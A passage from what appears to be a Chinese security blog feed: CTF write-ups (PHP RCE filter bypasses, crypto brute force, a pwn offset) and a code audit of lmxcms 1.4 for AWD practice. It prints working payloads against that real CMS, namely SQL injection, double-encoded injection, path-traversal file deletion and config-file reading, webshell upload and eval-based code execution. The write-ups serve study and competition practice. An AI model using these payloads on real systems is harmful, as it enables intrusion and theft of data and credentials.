class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;($&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%aa&#125;);&amp;%ff=system&amp;%aa=env</span><br></pre></td></tr></table></figure><h3 id="26-番外篇（3）这是…Webshell-revenge"><a href="#26-番外篇（3）这是…Webshell-revenge" class="headerlink" title="26 番外篇（3）这是…Webshell?_revenge"></a><strong>26 番外篇（3）这是…Webshell?_revenge</strong></h3><h4 id="考点：rce绕过"><a href="#考点：rce绕过" class="headerlink" title="考点：rce绕过"></a>考点：rce绕过</h4><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p><p><a href="https://forum.butian.net/share/1048">奇安信攻防社区-RCE全覆盖总结</a></p><p><img src="/../images/image-20251015102757340-1760512687700-82.png" alt="image-20251015102757340"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7744/?shell=?&gt;&lt;?= `. /???/????????[@-[]`?&gt;</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">-----------110</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">env</span><br><span class="line">-----------110--</span><br></pre></td></tr></table></figure><h3 id="26-番外篇（4）Moe笑传之猜猜爆"><a href="#26-番外篇（4）Moe笑传之猜猜爆" class="headerlink" title="26 番外篇（4）Moe笑传之猜猜爆"></a>26 番外篇（4）<strong>Moe笑传之猜猜爆</strong></h3><p>生成的随机数字存储在randomnumber，直接修改或者访问都可以</p><p><img src="/../images/image-20251015143332428-1760512687700-86.png" alt="image-20251015143332428"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">randomNumber = 50;</span><br></pre></td></tr></table></figure><h3 id="【未完成】27-番外篇（5）附加挑战"><a href="#【未完成】27-番外篇（5）附加挑战" class="headerlink" title="【未完成】27 番外篇（5）附加挑战"></a>【未完成】27 番外篇（5）<strong>附加挑战</strong></h3><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虽然说是新生赛，反序列化啊这种知识点还是不够全面，准备开一个《重生之我要当web糕手》系列，将缺少的知识点给补上</span><br><span class="line">java那一块也得，开始学开始补了，【这两题等补了java反序列化再回头看看吧】</span><br><span class="line">自己还是太菜，希望省赛真的补药爆零哇，到时候大彩笔的我不敢跟大师傅们面基了都。写的不好，欢迎和师傅们交流学习</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 一个男人一句话改变我的一生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个男人一句话改变我的一生之phpcms代码审计</title>
      <link href="/posts/12382.html"/>
      <url>/posts/12382.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写在前面：在各位大师傅的投喂下，涨了很多见识所以开始了一个男人一句话改变我的一生系列。</span><br><span class="line">这一期是跟su战队的_sun_·empty.师傅和timeline战队的扬丘师傅的一次awd训练赛，在_sun_·empty.说要复盘才有意义的建议下。</span><br><span class="line">写了这篇上年纪的cms代码审计，如文章有任何问题可以联系我进行交流，感谢观看</span><br></pre></td></tr></table></figure><h1 id="lmxcms1-4，代码审计–复现"><a href="#lmxcms1-4，代码审计–复现" class="headerlink" title="lmxcms1.4，代码审计–复现"></a>lmxcms1.4，代码审计–复现</h1><p>在awd训练赛中遇到了这套cms，于是打算学习审计一手</p><p>每种漏洞只找了一个代表学习不代表只要一个，实际的漏洞点有很多</p><p>参考了师傅们的博客,先在这里贴一手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_45764684/article/details/130962179</span><br><span class="line">https://blog.csdn.net/qq_38154820/article/details/129836774</span><br><span class="line">https://xz.aliyun.com/news/14971</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常规搭建cms：phpstudy+phpstorm,apache2.4.39+MySQL5.7.26,php5.3.29</span><br><span class="line"></span><br><span class="line">在小皮面板搭建之后，直接访问/install，根据流程设计数据库，后台账号密码就好了</span><br><span class="line"></span><br><span class="line">后台默认密码 admin/123456</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233911216.png" alt="image-20251010233911216"></p><h3 id="cms请求处理格式"><a href="#cms请求处理格式" class="headerlink" title="cms请求处理格式"></a>cms请求处理格式</h3><p>进来先看到前台入口文件</p><p>配置文件：&#x2F;inc&#x2F;config.inc.php</p><p>初始化文件：&#x2F;inc&#x2F;run.inc.php</p><p><img src="/../images/image-20251010225942615.png" alt="image-20251010225942615"></p><p><img src="/../images/image-20251010230623939.png" alt="image-20251010230623939"></p><p>全局【ctrl+shift+alt+n】搜run()</p><p><img src="/../images/image-20251010230743576.png" alt="image-20251010230743576"></p><p>分别传参是类名，方法名</p><p><a href="http://127.0.0.1/lmxcms1.4/admin.php?m=xx">?m&#x3D;xx</a>类名&amp;a&#x3D;xx方法</p><h3 id="后台SQL注入漏洞"><a href="#后台SQL注入漏洞" class="headerlink" title="后台SQL注入漏洞"></a>后台SQL注入漏洞</h3><p>漏洞点：参数可控，参与执行sql语句</p><p>在bookaction.class.php,可控参数名id,进入getReply函数<img src="/../images/image-20251010231637489.png" alt="image-20251010231637489"></p><p>getReply—&gt;selectModel—&gt;selectDB</p><p><img src="/../images/image-20251010232525224.png" alt="image-20251010232525224"></p><p><img src="/../images/image-20251010232529755.png" alt="image-20251010232529755"></p><p><img src="/../images/image-20251010232533337.png" alt="image-20251010232533337"></p><p>可以发现将id传进去，一层解一层在selectDB执行了sql语句</p><p>常规调试是不会看到sql语句，在执行之后添加echo $sql;来看具体的调试情况</p><p><img src="/../images/image-20251010232925033.png" alt="image-20251010232925033"></p><p>根据前面知道的请求格式，给id随便传个参数，注意方法名是一开始的reply()</p><p>【注意这个是admin下的后台漏洞】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=book&amp;a=reply&amp;id=1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233433548.png" alt="image-20251010233433548"></p><p>有回显，报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=Book&amp;a=reply&amp;id=1) and updatexml(0,concat(0x7e,user()),1)--+</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233633278.png" alt="image-20251010233633278"></p><h3 id="前台SQL注入漏洞"><a href="#前台SQL注入漏洞" class="headerlink" title="前台SQL注入漏洞"></a>前台SQL注入漏洞</h3><p>漏洞点：在过滤函数之前进行url解码【不严格】</p><p>找到name参数，由data来，追踪p有post和get传输</p><p><img src="/../images/image-20251011103134787.png"></p><p>有post和get传输，说明参数可控，回到处理name数据函数</p><p><img src="/../images/image-20251011103209563.png"></p><p>继续跟进getNameData</p><p><img src="/../images/image-20251011103412666.png"></p><p>–&gt;onemodel<img src="/../images/image-20251011103422783.png" alt="image-20251011103422783"></p><p>—&gt;oneDB,在oneDB中执行了sql语句，</p><p><img src="/../images/image-20251011103459787.png"></p><p>同时在p处理data的时候，发现了过滤非法提交信息函数filte_sql<img src="/../images/image-20251011103845173.png"></p><p>但是回到主函数可以看到有urldecode 并且是在执行sql语句之后</p><p><img src="/../images/image-20251011105045779.png" alt="image-20251011105045779"></p><p>二次编码注入：当对name传输数据时会先进行一次url解码，如果将payload二次编码，解了一次之后还有一层url编码，filte_sql就过滤不了恶意payload，产生漏洞了</p><p>【注意：客户端和服务端看代码的流程是要反过来的】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=tags&amp;name=%25%36%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%30%25%32%33</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011105625012.png" alt="image-20251011105625012"></p><h3 id="后台任意文件删除"><a href="#后台任意文件删除" class="headerlink" title="后台任意文件删除"></a>后台任意文件删除</h3><p>漏洞点：unlink函数</p><p>全局搜索调用情况</p><p><img src="/../images/image-20251011111212814.png" alt="image-20251011111212814"></p><p>delone</p><p><img src="/../images/image-20251011111317078.png" alt="image-20251011111317078"></p><p>delbackdb调用了delone，发现filename是get可控参数</p><p><img src="/../images/image-20251011111339902.png" alt="image-20251011111339902"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php？m=Backdb&amp;a=delbackdb&amp;filename=../../install/1.txt</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011111727606.png" alt="image-20251011111727606"></p><h3 id="后台任意文件读取"><a href="#后台任意文件读取" class="headerlink" title="后台任意文件读取"></a>后台任意文件读取</h3><p>漏洞点文件读取函数file_get_contents</p><p><img src="/../images/image-20251011113130400.png" alt="image-20251011113130400"></p><p>查看getcon调用情况</p><p><img src="/../images/image-20251011113321090.png" alt="image-20251011113321090"></p><p>dir参数可控，在当前editfile目录访问就能进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lmxcms//admin.php?m=Template&amp;a=editfile&amp;dir=admin/AD//ad.html</span><br><span class="line"></span><br><span class="line">http://lmxcms//admin.php?m=Template&amp;a=editfile&amp;dir=../inc//db.inc.php</span><br></pre></td></tr></table></figure><p>注意最后查看是&#x2F;&#x2F;</p><p><img src="/../images/image-20251011114801112.png" alt="image-20251011114801112"></p><h3 id="后台文件上传漏洞"><a href="#后台文件上传漏洞" class="headerlink" title="后台文件上传漏洞"></a>后台文件上传漏洞</h3><p>漏洞点：file_put_contents函数</p><p>在任意读取当中也存在文件上传漏洞 </p><p><img src="/../images/image-20251011115339998.png" alt="image-20251011115339998"></p><p><img src="/../images/image-20251011115404627.png" alt="image-20251011115404627"></p><p>post分别传入文件名称跟内容就好了【没有测成功】</p><p><img src="/../images/image-20251011143322125.png" alt="image-20251011143322125"></p><p>黑盒的后台文件上传漏洞，可以自行修改文件上传类型</p><p><img src="/../images/image-20251011143422118.png" alt="image-20251011143422118"></p><p>上传构造好的php文件就好了</p><p><img src="/../images/image-20251011143530032.png" alt="image-20251011143530032"></p><h3 id="后台命令执行漏洞"><a href="#后台命令执行漏洞" class="headerlink" title="后台命令执行漏洞"></a>后台命令执行漏洞</h3><p>漏洞点：sql写马导致rec</p><p>找到eval函数 跟进参数get传参cid可控</p><p><img src="/../images/image-20251011144452040.png" alt="image-20251011144452040"></p><p>走进caijidataone函数，发现掉了cj_data_tab()</p><p><img src="/../images/image-20251011144548654.png" alt="image-20251011144548654"></p><p>查询的是cj_data表</p><p><img src="/../images/image-20251011144730710.png" alt="image-20251011144730710"></p><p><img src="/../images/image-20251011144741088.png" alt="image-20251011144741088"></p><p><img src="/../images/image-20251011144744835.png" alt="image-20251011144744835"></p><p>那么只要在cj_data表中插入，恶意代码，在执行sql查询执行了恶意代码实现命令执行,后台找到可以执行sql语句的地方</p><p><img src="/../images/image-20251011150025893.png" alt="image-20251011150025893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lmxcms`.`lmx_cj_data` (`id`, `lid`, `data`, `uid`, `url`, `time`) VALUES (3, 4, &#x27;phpinfo()&#x27;, 33, &#x27;a&#x27;, 5);</span><br><span class="line"></span><br><span class="line">/admin.php?m=Acquisi&amp;a=showCjData&amp;id=1&amp;lid=4&amp;cid=3</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011150355759.png" alt="image-20251011150355759"></p><p><img src="/../images/image-20251011145940775.png" alt="image-20251011145940775"></p><h3 id="awd思路"><a href="#awd思路" class="headerlink" title="awd思路"></a>awd思路</h3><p>因为是从awd中遇到的cms，如何获得flag，提交拿到分数才是重点</p><p>能获得本地根目录下的flag基本上是后台漏洞为主</p><h4 id="登陆对抗"><a href="#登陆对抗" class="headerlink" title="登陆对抗"></a>登陆对抗</h4><h5 id="维护"><a href="#维护" class="headerlink" title="维护"></a>维护</h5><p>连接相应的数据库替换 admin的默认密码pwd字段【是否加salt】</p><p><img src="/../images/image-20251011151829593.png" alt="image-20251011151829593"></p><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><p>如果cms的默认密码被改了的情况下，可以使用前台sql注入漏洞获得相应admin的pwd字段【但不一定能够解密出来】</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>在awd当中要攻击的主机不止一台，在没有权限控制的情况下，是否可以写一个批量登陆脚本获得cookie【没来得及验证】，为后面打exp要验证管理员身份做铺垫</p><h4 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h4><p>在awd过程当中这一套cms的漏洞打得多的是删除和上传。</p><p>在读取没有被修的情况下，效率最高，只要登陆后台，打exp就好了</p><p>打的时候，发现家里啥都被删没了和多了一堆马子都是痛苦的</p><p>文件上传点依旧是经典的一句话木马转不死马，被打进来的时候，还找不到竞争脚本，下次应该开局先放上去的</p><p>这一次的点全在后台，打exp要权限验证，没整过这个点，以至于后面摆烂拖后腿了</p><p>维护的话，还是感觉修改默认密码，加ctf_waf，每个点改的话来不及，但是这次都没加【下源码下了20分钟】不嘻嘻</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这次坑了sun和杨丘师傅，感谢不杀之恩，我下一次肯定会做到的【坚信】</p><p>phpcms的代码审计，寻找可控参数变量，有没有参与危险函数，白盒+黑盒一起试，搭建的时候注意配置，awd的时候，要快速的打exp和历史漏洞获得分数，注意常规的维护。pwn是堆溢出【等我再沉淀沉淀】</p>]]></content>
      
      
      <categories>
          
          <category> 一个男人一句话改变我的一生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届NetDreamCTF赛后复现</title>
      <link href="/posts/38132.html"/>
      <url>/posts/38132.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一届NetDreamCTF赛后复现（部分题目）"><a href="#第一届NetDreamCTF赛后复现（部分题目）" class="headerlink" title="第一届NetDreamCTF赛后复现（部分题目）"></a>第一届NetDreamCTF赛后复现（部分题目）</h2><p>全部的题解：<a href="https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw">https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw</a></p><p>存档：<a href="https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source">https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source</a></p><p>纸豪学长的讲解：<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025题目讲解 ezpwn&amp;ezupload&amp;ezbypass_哔哩哔哩_bilibili</a></p><p><img src="/../images/image-20250817140400019.png" alt="image-20250817140400019"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：你知道Base和TXT吗?Y3RmLmN0Zi52aW4=</span><br></pre></td></tr></table></figure><p>base64解码之后 txt域名解析记录</p><p><img src="/../images/image-20250817140706604.png" alt="image-20250817140706604"></p><p><img src="/../images/image-20250817140803070.png" alt="image-20250817140803070"></p><h4 id="I-AM-K"><a href="#I-AM-K" class="headerlink" title="I AM K!"></a>I AM K!</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">B3F0re赵的立方体-1398441600</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encrypt(plaintext, key):</span><br><span class="line">    key_sum = sum(ord(char) for char in key)</span><br><span class="line">    if not plaintext.startswith(&quot;flag&#123;&quot;):</span><br><span class="line">        plaintext = &quot;flag&#123;&quot; + plaintext</span><br><span class="line">    if not plaintext.endswith(&quot;&#125;&quot;):</span><br><span class="line">        plaintext += &quot;&#125;&quot;</span><br><span class="line">    </span><br><span class="line">    encrypted = []</span><br><span class="line">    for char in plaintext:</span><br><span class="line">        encrypted_char = (ord(char) + key_sum) % 256 </span><br><span class="line">        encrypted.append(encrypted_char)</span><br><span class="line"></span><br><span class="line">    encrypted_bytes = bytes(encrypted)</span><br><span class="line">    base64_encoded = base64.b64encode(encrypted_bytes).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    shift = key_sum % 26</span><br><span class="line">    caesar_shifted = &quot;&quot;</span><br><span class="line">    for char in base64_encoded:</span><br><span class="line">        if char.isalpha():</span><br><span class="line">            shifted_char = chr(((ord(char) - ord(&#x27;A&#x27;) + shift) % 26 + ord(&#x27;A&#x27;))) if char.isupper() else chr(((ord(char) - ord(&#x27;a&#x27;)) + shift) % 26 + ord(&#x27;a&#x27;))</span><br><span class="line">            caesar_shifted += shifted_char</span><br><span class="line">        else:</span><br><span class="line">            caesar_shifted += char</span><br><span class="line">    hex_encoded = caesar_shifted.encode(&#x27;utf-8&#x27;).hex()</span><br><span class="line">    </span><br><span class="line">    return hex_encoded</span><br><span class="line"></span><br><span class="line">key = &quot;xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx&quot;</span><br><span class="line"></span><br><span class="line">plaintext = &quot;Thi5 1s th3 Fl@g&quot; </span><br><span class="line"></span><br><span class="line">ciphertext = encrypt(plaintext, key)</span><br><span class="line">print(ciphertext)</span><br><span class="line"></span><br><span class="line">#686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248</span><br></pre></td></tr></table></figure><p>1.(ASCII值 + key_sum) % 256</p><p>2.字节列表转换为字节串，再进行 Base64 编码</p><p>3.凯撒移位</p><p>4.十六进制编码</p><p>这里是自己爆破密钥了 预期确实精妙【musc】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_keysum</span>(<span class="params">ciphertext_hex, key_sum</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Hex decode</span></span><br><span class="line">        ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">        caesar_shifted = ciphertext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse Caesar shift</span></span><br><span class="line">        shift = key_sum % <span class="number">26</span></span><br><span class="line">        base64_encoded = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> caesar_shifted:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():</span><br><span class="line">                <span class="keyword">if</span> char.isupper():</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">                base64_encoded += shifted_char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base64_encoded += char</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Base64 decode</span></span><br><span class="line">        encrypted_bytes = base64.b64decode(base64_encoded)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse additive cipher</span></span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_bytes:</span><br><span class="line">            decrypted_char = (byte - key_sum) % <span class="number">256</span></span><br><span class="line">            plaintext += <span class="built_in">chr</span>(decrypted_char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check for &#x27;flag&#123;...&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> plaintext.startswith(<span class="string">&quot;flag&#123;&quot;</span>) <span class="keyword">and</span> plaintext.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> plaintext</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">ciphertext_hex = <span class="string">&quot;686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Brute-force key_sum from 0 to 10000</span></span><br><span class="line"><span class="keyword">for</span> key_sum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10001</span>):</span><br><span class="line">    plaintext = decrypt_with_keysum(ciphertext_hex, key_sum)</span><br><span class="line">    <span class="keyword">if</span> plaintext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found key_sum = <span class="subst">&#123;key_sum&#125;</span>, plaintext = <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="ezimg"><a href="#ezimg" class="headerlink" title="ezimg"></a>ezimg</h4><p>这里做的时候被做局了 没看到py文件藏的 还是太单纯了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：给了张奶龙图片</span><br></pre></td></tr></table></figure><p>![milkdragon (1)](..&#x2F;images&#x2F;milkdragon (1).jpg)</p><p>使用winhex打开图片，在最后有两段的base64密文</p><p><img src="/../images/image-20250817142438533.png" alt="image-20250817142438533"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1GJ411x7h7/</span><br><span class="line">https://docs.qq.com/doc/DZWxobHhmRW9pd09k</span><br></pre></td></tr></table></figure><p>第一个是纯骚扰</p><p>打开第二个，全部复制出来有</p><p><img src="/../images/image-20250817142615568.png" alt="image-20250817142615568"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">并非flag</span><br><span class="line">flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;</span><br><span class="line">aHR0cHM6Ly93d2duLmxhbnpvdWwuY29tL2kzcTR5MzBodWVmYQ==</span><br></pre></td></tr></table></figure><p> 再解密有一个下载链接里面有个压缩包里面是个py文件</p><p> <img src="/../images/image-20250817142948773.png" alt="image-20250817142948773"></p><p> 没看到下面还有东西 没做出来</p><p><img src="/../images/image-20250817143016863.png" alt="image-20250817143016863"></p><p> 将上面获得的flag放进去解密就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = base64.urlsafe_b64encode(<span class="string">b&#x27;flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;&#x27;</span>[:<span class="number">32</span>].ljust(<span class="number">32</span>, <span class="string">b&#x27;\0&#x27;</span>)[:<span class="number">32</span>])</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line">c=</span><br><span class="line"><span class="string">&quot;gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s&quot;</span></span><br><span class="line">decrypted = cipher.decrypt(c.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted plaintext:&quot;</span>, decrypted.decode())</span><br></pre></td></tr></table></figure><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h4><p>- </p><p>这里贴一下[纸豪]<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1387.homepage.video_card.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025题目讲解 ezpwn&amp;ezupload&amp;ezbypass_哔哩哔哩_bilibili</a>学长~ 的链接 声音很帅</p><p> <img src="/../images/image-20250817153655298.png" alt="image-20250817153655298"></p><p> 题目进来跟进到vuln</p><p><img src="/../images/image-20250817153729143.png" alt="image-20250817153729143"></p><p> <img src="/../images/image-20250817154009298.png" alt="image-20250817154009298"></p><p> 明显的栈溢出 找后门地址和偏移量</p><p><img src="/../images/image-20250817154040309.png" alt="image-20250817154040309"></p><p> <img src="/../images/image-20250817154054280.png" alt="image-20250817154054280"></p><p>使用cyclic工具测算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cyclic 100</span><br><span class="line">gdb ./pwn</span><br><span class="line">输入生成的字符串 看到停在了0x61616174</span><br><span class="line">cyclic -l 0x61616174 得到偏移量76</span><br></pre></td></tr></table></figure><p><img 